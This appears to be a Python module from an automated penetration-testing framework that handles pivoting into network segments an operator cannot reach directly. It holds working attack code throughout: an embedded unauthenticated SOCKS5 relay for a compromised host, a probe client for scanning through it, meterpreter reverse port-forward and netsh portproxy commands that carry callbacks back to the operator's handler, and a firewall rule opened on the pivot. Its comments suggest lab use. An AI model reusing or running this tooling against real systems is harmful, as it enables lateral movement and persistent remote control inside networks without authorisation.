"""中继：够不着的目标怎么够到（爷爷 2026-10-06：现在补上，为"换靶场"泛化）。

两个方向，各自都是独立进程，断了不影响别的会话：

* **访问方向**：中间机上跑一个最小 SOCKS5 服务端（只做 CONNECT、无认证），控制端经它打深网段；
* **回程方向**：在跳板上把监听端口接到控制端 handler（两条路，优先会话原生那条：
  meterpreter 会话用自带 portfwd -L，裸 cmd 壳退回系统自带 netsh portproxy），
  这样深网段的主机只能"回调到跳板"也能把会话交回来。

两类动作都会登记通道行（kind=proxy）与产物行（listener/config/firewall），回收表一走就干净。
"""
from __future__ import annotations

import json
import time
from pathlib import Path
from uuid import uuid4

from graph.files import atomic_write
from runtime import artifacts

#: 访问方向的最小 SOCKS5 服务端（python3，无第三方依赖；只支持 CONNECT，无认证）。
SOCKS5_SERVER = r'''import socket, struct, sys, threading

BIND = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 1080)


def pipe(src, dst):
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            dst.sendall(data)
    except OSError:
        pass
    finally:
        for sock in (src, dst):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass


def handle(conn):
    try:
        head = conn.recv(2)
        if len(head) < 2 or head[0] != 5:
            return
        conn.recv(head[1])
        conn.sendall(b"\x05\x00")
        request = conn.recv(4)
        if len(request) < 4 or request[0] != 5:
            return
        command, atyp = request[1], request[3]
        if atyp == 1:
            host = socket.inet_ntoa(conn.recv(4))
        elif atyp == 3:
            length = conn.recv(1)[0]
            host = conn.recv(length).decode("idna")
        elif atyp == 4:
            host = socket.inet_ntop(socket.AF_INET6, conn.recv(16))
        else:
            return
        port = struct.unpack("!H", conn.recv(2))[0]
        if command != 1:
            conn.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        try:
            upstream = socket.create_connection((host, port), timeout=10)
        except OSError:
            conn.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        conn.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        threading.Thread(target=pipe, args=(conn, upstream), daemon=True).start()
        pipe(upstream, conn)
    except OSError:
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((BIND, PORT))
    server.listen(64)
    print("AGV_SOCKS_READY %s:%d" % (BIND, PORT), flush=True)
    while True:
        conn, _ = server.accept()
        threading.Thread(target=handle, args=(conn,), daemon=True).start()


if __name__ == "__main__":
    main()
'''

#: 从控制端经中继探一个端口用的最小客户端（报告 CONNECTED / REFUSED / ERROR）。
RELAY_PROBE = r'''import socket, struct, sys

relay_host, relay_port, target_host, target_port = sys.argv[1:5]
relay_port, target_port = int(relay_port), int(target_port)


def say(word):
    print("AGV_RELAY_" + word, flush=True)


try:
    conn = socket.create_connection((relay_host, relay_port), timeout=8)
except OSError as error:
    say("ERROR reason=relay_unreachable detail=%s" % type(error).__name__)
    raise SystemExit(3)

try:
    conn.sendall(b"\x05\x01\x00")
    if conn.recv(2) != b"\x05\x00":
        say("ERROR reason=relay_handshake")
        raise SystemExit(3)
    conn.sendall(b"\x05\x01\x00\x03" + bytes([len(target_host)]) + target_host.encode()
                 + struct.pack("!H", target_port))
    reply = conn.recv(10)
except OSError as error:
    say("ERROR reason=relay_broken detail=%s" % type(error).__name__)
    raise SystemExit(3)

if len(reply) < 2:
    say("ERROR reason=relay_short_reply")
elif reply[1] == 0:
    say("CONNECTED")
elif reply[1] == 5:
    say("REFUSED")
else:
    say("ERROR reason=relay_status_%d" % reply[1])
'''




def portproxy_argv(*, listen_port, listen_host="0.0.0.0", connect_host="", connect_port="",
                   delete=False) -> list:
    """系统自带的 portproxy：跳板上不是 meterpreter 会话时用的那条路。

    ``delete`` 必须带**与创建时相同的 listenaddress**：实测 2026-10-06，只给 listenport 会报
    "系统找不到指定的文件"而删不掉 —— 回收表里那条只写 listenport 的逆操作就是坏的。
    """
    if delete:
        return ["netsh", "interface", "portproxy", "delete", "v4tov4",
                "listenaddress=%s" % listen_host, "listenport=%s" % listen_port]
    return ["netsh", "interface", "portproxy", "add", "v4tov4",
            "listenaddress=%s" % listen_host, "listenport=%s" % listen_port,
            "connectaddress=%s" % connect_host, "connectport=%s" % connect_port]


def portfwd_argv(*, listen_port, connect_port, local_host="0.0.0.0") -> list:
    """meterpreter 的**反向**端口转发（语法是实测出来的，不是猜的）。

    2026-10-06 walk-50 实测（回执 relay-2091.json 原文）：

        portfwd add -L 0.0.0.0:2091 -r 192.168.52.128 -p 1091
        -> [-] You must supply a local port, remote host, and remote port.

    照它自己的行为，反向转发要加 -R，而且参数含义与正向不同：

        portfwd add -R -l <我方要连的端口> -L <我方要连的地址> -p <目标侧要监听的端口>
        -> [*] Reverse TCP relay created: (remote) [::]:2091 -> (local) 0.0.0.0:1091

    也就是：**-p 是目标侧监听的端口**（深网段主机回调到这里），**-l 是我方 handler 的端口**。
    -r 在反向里被忽略（它自己会提示），所以不传，免得日志里多一句误导。
    """
    return ["portfwd", "add", "-R", "-l", str(connect_port), "-L", str(local_host),
            "-p", str(listen_port)]


def portfwd_delete_argv(index) -> list:
    """删除一条反向转发：实测只有 -i <序号> 有效（-l/-p 组合报 Failed to stop TCP relay）。"""
    return ["portfwd", "delete", "-i", str(index)]


def portfwd_index(listing, listen_port) -> str:
    """从 portfwd list 的输出里挑出监听该端口那条的序号（删除要用）；挑不到返回空串。"""
    for line in str(listing or "").replace("\r", "").splitlines():
        cells = line.split()
        if len(cells) >= 3 and cells[0].isdigit() and str(listen_port) in line:
            return cells[0]
    return ""

def meterpreter_carrier(channel) -> bool:
    """这条载体是不是一个 meterpreter 会话：只有它能说 portfwd 这种原生命令。"""
    return (str((channel or {}).get("kind") or "") == "console_session"
            and str((channel or {}).get("session_type") or "").strip().lower() == "meterpreter")

#: 每条回执留多少字：够人看出 netsh 到底回了什么（成功 / 拒绝 / 语法），又不至于把整页回读灌进记录。
RECEIPT_TEXT_LIMIT = 4000


def _windows_pivot(channel) -> bool:
    """跳板是不是 Windows —— 决定回程门走**系统转发**还是 meterpreter 原生转发。

    判据只取载体自己声明的平台/会话类型，不从命令文本猜（2026-10-06 实测：系统转发
    `netsh portproxy` 真的把连接转回控制端；meterpreter 的 `portfwd -R` 只接不转）。
    Linux 跳板的回程是另一条路（ssh -R / socat），这里只回答"是不是 Windows"。
    """
    platform = str((channel or {}).get("platform") or "").lower()
    session_type = str((channel or {}).get("session_type") or "").lower()
    return platform.startswith("windows") or "windows" in session_type


def _receipt(request, result) -> dict:
    """Keep transport completion and command completion separate."""
    outcome = result["outcome"]
    return {"request": dict(request),
            "confirmed": bool(result["confirmed"]),
            "command_rc": result["command_rc"],
            "transport_rc": getattr(outcome, "returncode", None),
            "read_stop": getattr(outcome, "read_stop", None),
            "timed_out": bool(getattr(outcome, "timed_out", False)),
            "stdout": str(getattr(outcome, "stdout", "") or "")[:RECEIPT_TEXT_LIMIT],
            "stderr": str(getattr(outcome, "stderr", "") or "")[:RECEIPT_TEXT_LIMIT]}


def start_return(executor, channel, *, listen_port, listen_host="0.0.0.0", connect_host,
                 connect_port, route, run_dir=None, node="", evidence_dir=None, attempts=2) -> dict:
    """Run the declared relay route through an explicitly bound session."""
    from runtime import session_io
    if route not in {"netsh-portproxy", "meterpreter-portfwd"}:
        raise ValueError("RETURN_RELAY_ROUTE_UNDECLARED")
    if not isinstance(channel, dict) or not channel.get("session_id"):
        raise ValueError("RETURN_RELAY_SESSION_UNBOUND")
    use_portproxy = route == "netsh-portproxy"
    if use_portproxy and not str(channel.get("platform") or "").lower().startswith("windows"):
        raise ValueError("RETURN_RELAY_PLATFORM_MISMATCH")
    if not use_portproxy and channel.get("session_type") != "meterpreter":
        raise ValueError("RETURN_RELAY_SESSION_TYPE_MISMATCH")

    def request_for(argv):
        if use_portproxy:
            return {"tool": "tool", "name": argv[0], "args": list(argv[1:])}
        return {"tool": "msf", "cmd": " ".join(argv)}

    def completed(result):
        return result["confirmed"] and result["command_rc"] == 0

    def listed(text):
        if not use_portproxy:
            #: `portfwd list` 的真机原文（2026-10-08 实测）：
            #:
            #:     Index  Local                Remote     Direction
            #:     1      192.168.52.128:1090  [::]:2090  Reverse
            #:
            #: 反向那条的 Local 是**控制端**这一头（`host:connect_port`），Remote 是跳板上要监听的
            #: 那一头（`[::]:listen_port`）。以前这里对 portfwd 路线直接返回 False，于是**这条路线
            #: 永远装不成**（`RETURN_RELAY_UNCONFIRMED`，明明 add 的 rc=0）—— 回程门形同虚设。
            for line in str(text or "").replace("\r", "").splitlines():
                cells = line.split()
                if len(cells) < 4 or not cells[0].isdigit():
                    continue
                local, remote, direction = cells[1], cells[2], cells[3].lower()
                if ("reverse" in direction and remote.rsplit(":", 1)[-1] == str(listen_port)
                        and local.rsplit(":", 1)[-1] == str(connect_port)):
                    return True
            return False
        expected = [str(listen_host), str(listen_port), str(connect_host), str(connect_port)]
        return any(line.split() == expected for line in str(text).splitlines())

    if run_dir is not None:
        artifacts.record(run_dir, kind="config", host=str(channel.get("host") or ""),
                         node=node, target="%s %s:%s -> %s:%s" % (
                             route, listen_host, listen_port, connect_host, connect_port),
                         detail="return relay intent", state="declared",
                         undo=(portproxy_argv(listen_port=listen_port, listen_host=listen_host,
                                              delete=True) if use_portproxy else []))
    steps = []
    add_rc, listening, ok = None, False, False
    back_request = request_for(["netsh", "interface", "portproxy", "show", "all"]
                               if use_portproxy else ["portfwd", "list"])
    for attempt in range(1, max(1, int(attempts)) + 1):
        argv = (portproxy_argv(listen_port=listen_port, listen_host=listen_host,
                              connect_host=connect_host, connect_port=connect_port)
                if use_portproxy else
                portfwd_argv(listen_port=listen_port, connect_port=connect_port,
                             local_host=connect_host))
        add_request = request_for(argv)
        add = session_io.call_bound(channel, add_request, 60.0)
        if not add["confirmed"]:
            steps.append({"attempt": attempt, "add": _receipt(add_request, add),
                          "listening": False})
            break
        listing = session_io.call_bound(channel, back_request, 60.0)
        add_rc = add["command_rc"]
        listening = completed(listing) and listed(listing["outcome"].stdout)
        ok = completed(add) and listening
        steps.append({"attempt": attempt, "add": _receipt(add_request, add),
                      "readback": _receipt(back_request, listing), "listening": listening})
        if ok or not listing["confirmed"]:
            break
    tried = len(steps)
    rule_rc, rule_ok = None, False
    rule_name = "agv-return-%s" % listen_port
    if use_portproxy and ok:
        rule_request = {"tool": "tool", "name": "netsh", "args": [
            "advfirewall", "firewall", "add", "rule", "name=" + rule_name,
            "dir=in", "action=allow", "protocol=TCP", "localport=%s" % listen_port]}
        if run_dir is not None:
            artifacts.record(run_dir, kind="firewall", host=str(channel.get("host") or ""),
                             node=node, target=rule_name, detail="inbound relay rule intent",
                             state="declared", undo=["netsh", "advfirewall", "firewall", "delete",
                                                     "rule", "name=" + rule_name])
        rule = session_io.call_bound(channel, rule_request, 60.0)
        rule_rc, rule_ok = rule["command_rc"], completed(rule)
        steps.append({"attempt": 0, "firewall": _receipt(rule_request, rule)})
        ok = ok and rule_ok
    receipts, evidence_error = "", ""
    if evidence_dir is not None:
        path = Path(evidence_dir) / ("relay-%s.json" % listen_port)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            atomic_write(path, (json.dumps({"at": time.time(), "node": str(node), "ok": ok,
                                        "route": route, "listen_port": listen_port,
                                        "connect": "%s:%s" % (connect_host, connect_port),
                                        "steps": steps}, ensure_ascii=False, indent=1) + "\n")
                         .encode("utf-8"), force=True)
            receipts = str(path)
        except OSError as error:
            evidence_error = "%s: %s" % (type(error).__name__, error)
    return {"ok": ok, "route": route, "listen_port": listen_port, "add_rc": add_rc,
            "listening": listening, "rule_rc": rule_rc, "tried": tried,
            "receipts": receipts, "evidence_error": evidence_error,
            "reason": "" if ok else "RETURN_RELAY_UNCONFIRMED",
            "connect": "%s:%s" % (connect_host, connect_port)}

def probe_over_relay(executor, reach, *, target_host, target_port, timeout=25.0) -> tuple:
    """经中继探一个深网段端口；三类语义分清楚（别把中继故障当目标安静）。"""
    host, _, port = reach.partition("://")[2].partition(":")
    argv = ["python3", "-c", RELAY_PROBE, host, str(port or ""), str(target_host), str(target_port)]
    outcome = executor(argv, timeout)
    text = str(getattr(outcome, "stdout", "") or "")
    lines = text.strip().splitlines()
    last = lines[-1] if lines else "no output"
    if "AGV_RELAY_CONNECTED" in text:
        return "connected", last
    if "AGV_RELAY_REFUSED" in text:
        return "refused", last
    return "relay_error", last


def pivot_address(executor, *, target_host, carrier=None, timeout=60.0,
                  evidence=None) -> str:
    """Read addresses through the exact bound session and require completed evidence."""
    from runtime import session_io
    if not isinstance(carrier, dict) or not carrier.get("session_id"):
        raise ValueError("PIVOT_SESSION_UNBOUND")
    platform = str(carrier.get("platform") or "").lower()
    if platform.startswith("windows"):
        request = {"tool": "tool", "name": "ipconfig", "args": []}
    elif platform.startswith("linux"):
        request = {"tool": "cmd", "cmd": "ip -o -4 addr show 2>/dev/null || ifconfig -a"}
    else:
        raise ValueError("PIVOT_PLATFORM_UNDECLARED")
    result = session_io.call_bound(carrier, request, timeout)
    if not result["confirmed"] or result["command_rc"] != 0:
        if evidence is not None:
            evidence.update({"reason": "PIVOT_ADDRESS_UNCONFIRMED",
                             "receipt": _receipt(request, result)})
        return ""
    text = str(result["outcome"].stdout or "")
    wanted = ".".join(str(target_host).split(".")[:3])
    seen = []
    for chunk in text.replace("\r", " ").split():
        candidate = chunk.strip("() ,;")
        parts = candidate.split(".")
        if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
            continue
        seen.append(candidate)
        if ".".join(parts[:3]) == wanted:
            return candidate
    if evidence is not None:
        evidence.update({"target": str(target_host), "wanted": wanted,
                         "seen": seen, "raw_head": text[:400]})
    return ""


def arm_return(executor, *, carrier, listen_host, listen_port, console_host, console_port,
               route, run_dir=None, node="") -> dict:
    """Install only the explicitly declared return route and listening address."""
    if not listen_host:
        return {"ok": False, "reason": "PIVOT_ADDRESS_UNDECLARED"}
    plan = start_return(executor, carrier, listen_port=listen_port, listen_host=listen_host,
                        connect_host=console_host, connect_port=console_port, route=route,
                        run_dir=run_dir, node=node)
    plan["listen_host"] = listen_host
    return plan
